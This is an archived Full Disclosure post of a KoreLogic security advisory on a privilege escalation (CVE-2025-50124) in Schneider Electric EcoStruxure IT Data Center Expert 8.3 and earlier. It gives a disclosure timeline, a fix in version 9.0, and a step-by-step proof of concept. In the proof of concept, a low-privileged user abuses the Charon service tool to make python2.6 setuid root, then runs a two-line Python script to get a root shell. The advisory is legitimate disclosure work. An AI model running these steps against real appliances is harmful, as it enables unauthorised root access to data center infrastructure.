---
title: KL-001-2025-010: Schneider Electric EcoStruxure IT Data Center Expert Privilege Escalation
url: https://seclists.org/fulldisclosure/2025/Jul/9
source: Full Disclosure
date: 2025-07-10
fetch_date: 2025-10-06T23:52:24.075608
---

# KL-001-2025-010: Schneider Electric EcoStruxure IT Data Center Expert Privilege Escalation

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-010: Schneider Electric EcoStruxure IT Data Center Expert Privilege Escalation

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 9 Jul 2025 17:17:32 -0500

---

```
KL-001-2025-010: Schneider Electric EcoStruxure IT Data Center Expert Privilege Escalation

Title: Schneider Electric EcoStruxure IT Data Center Expert Privilege Escalation
Advisory ID: KL-001-2025-010
Publication Date: 2025-07-09
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-010.txt

1. Vulnerability Details

     Affected Vendor: Schneider Electric
     Affected Product: EcoStruxure IT Data Center Expert
     Affected Version: 8.3 and prior
     Platform: CentOS
     CWE Classification: CWE-266: Incorrect Privilege Assignment
     CVE ID: CVE-2025-50124

2. Vulnerability Description

     The Data Center Expert ("DCE") appliance contains a Charon
     executable that can be used by a low-privileged attacker to
     obtain root privileges. The Charon executable and configuration
     appears to be a local method for adding and removing services
     that run within the DCE appliance.

3. Technical Description

     The low-privilege user accounts that come by default on the
     DCE appliance are restricted to very specific functions and
     limited shell/menu interfaces. Arbitrary or customer-specific
     low-privileged user accounts do not appear to be permitted
     by design in the DCE appliance. However, if a low-privileged
     shell is obtained by some method, the Charon executable can
     be leveraged to obtain root privileges.

     After having obtained root-level compromise with the
     Hostname RCE vulnerability in the .bcsetup script
     (CVE-2025-50123/KL-001-2025-009), researchers added
     (i.e. useradd) a low-privileged account on the appliance. The
     idea behind setting up a low-privileged account was to see if
     there were privilege- escalations paths, in the event that an
     attacker was able to obtain a low-privileged account/shell on
     the box.

     The Charon executable and associated configuration file
     (/etc/nbc/cerberus.cfg), allow for "start" and "stop" commands
     that are executed as root. A low-privileged attacker could
     assign their own Charon "application" with attacker-defined
     "start" and "stop" commands, as illustrated below.

4. Mitigation and Remediation Recommendation

     Version 9.0 of EcoStruxure IT Data Center Expert includes
     fixes for these vulnerabilities and is available upon request
     from Schneider Electric's Customer Care Center. Refer to
https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2025-189-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2025-189-01.pdf.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-11-21 : KoreLogic reports vulnerability details to
                  Schneider Electric CPCERT.
     2024-11-22 : Vendor acknowledges receipt of KoreLogic's
                  submission.
     2024-12-06 : Vendor confirms the reported vulnerability.
     2024-12-12 : Vendor requests a meeting with KoreLogic to discuss
                  the timeline of remediation efforts for this
                  vulnerability, as well as for associated submissions
                  from KoreLogic.
     2024-12-18 : KoreLogic and Schneider Electric agree to embargo
                  vulnerability details until product update 9.0,
                  circa July, 2025.
     2025-01-29 : Vendor provides status update.
     2025-03-17 : Vendor provides beta release containing remediation
                  for this and other associated vulnerabilities
                  reported by KoreLogic.
     2025-06-20 : Vendor notifies KoreLogic that the publication date
                  for this vulnerability will be 2025-07-08.
     2025-07-08 : Vendor public disclosure.
     2025-07-09 : KoreLogic public disclosure.

7. Proof of Concept

     Attacker lists the Charon applications that are currently
     configured on the appliance:

         [attacker@xyzzy ~]$ /usr/local/netbotz/nbc/bin/charon list
         Tue Jun  4 08:37:37 2024 - loading configuration
         Application # 0
           name=NBC
           pre="NONE"
           start="/usr/local/netbotz/nbc/bin/central.sh"
           stop="/usr/local/netbotz/nbc/bin/central.sh stop"
           sort=15

     Attacker adds a new Charon application called "root-it" to
     the appliance. The application when started, will execute the
     "/bin/chmod u+s /usr/bin/python2.6" command, and when the
     application is stopped, it will execute "bin/chmod u-s
     /usr/bin/python2.6".
```

         [attacker@xyzzy ~]$ /usr/local/netbotz/nbc/bin/charon add root-it "/bin/chmod u+s /usr/bin/python2.6"
"/bin/chmod u-s /usr/bin/python2.6" 1 NONE

```
         Added application root-it

     The command below shows that the python2.6 executable is not setuid root.

         [attacker@xyzzy ~]$ ls -al /usr/bin/python2.6
         -rwxr-xr-x 2 root root 9032 Aug 18  2016 /usr/bin/python2.6

     The cerberus.cfg file contains the Charon applications and their configuration.

         [attacker@xyzzy ~]$ cat /etc/nbc/cerberus.cfg
         #
         # Cerberus Config File
         #

         [NBC]
         sort=15
         pre=NONE
         start=/usr/local/netbotz/nbc/bin/central.sh
         stop=/usr/local/netbotz/nbc/bin/central.sh stop

         [root-it]
         sort=1
         pre=NONE
         start=/bin/chmod u+s /usr/bin/python2.6
         stop=/bin/chmod u-s /usr/bin/python2.6

     Attacker starts the "root-it" application:

         [attacker@xyzzy ~]$ /usr/local/netbotz/nbc/bin/charon start root-it
         Started application root-it with pid 19556

     The python2.6 executable is not setuid root.

         [attacker@xyzzy ~]$ ls -al /usr/bin/python2.6
         -rwsr-xr-x 2 root root 9032 Aug 18  2016 /usr/bin/python2.6

     A simple python script can leverage the setuid root python2.6 executable
     to gain a root shell.

         [attacker@xyzzy ~]$ cat ./root-it.py
         import os

         os.setuid(0)
         os.system("/bin/bash")

         [attacker@xyzzy ~]$ id
         uid=503(attacker) gid=503(attacker) groups=503(attacker)

         [attacker@xyzzy ~]$ /usr/bin/python2.6 ./root-it.py

         [root@xyzzy ~]# id
         uid=0(root) gid=503(attacker) groups=503(attacker)

         [root@xyzzy ~]# exit

         [attacker@xyzzy ~]$ ls -al /usr/bin/python2.6
         -rwsr-xr-x 2 root root 9032 Aug 18  2016 /usr/bin/python2.6

     Attacker can stop the "root-it" application to remove setuid root
     on the python2.6 executable.

         [attacker@xyzzy ~]$ /usr/local/netbotz/nbc/bin/charon stop root-it
         Killed application root-it

         [attacker@xyzzy ~]$ ls -al /usr/bin/python2.6
         -rwxr-xr-x 2 root root 9032 Aug 18  2016 /usr/bin/python2.6

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned...